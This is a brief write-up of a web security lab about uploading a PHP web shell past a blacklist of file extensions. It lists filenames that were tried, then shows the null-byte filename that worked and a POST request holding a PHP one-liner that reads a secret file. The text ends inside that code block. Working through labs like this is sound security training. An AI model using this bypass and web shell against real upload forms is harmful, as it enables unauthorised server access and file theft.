
# Web shell upload via obfuscated file extension

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

I tried to upload the file with the names:

- “test.php.jpg” but it is interepreted as an image.

- “test.php.” but it is not accepted

- “test%2Ephp” but it is not accepted


The payload “test.php%00.jpg” uploads a file “test.php”:

```
POST /my-account/avatar HTTP/2

<?php echo file_get_contents('/home/carlos/secret'); ?>
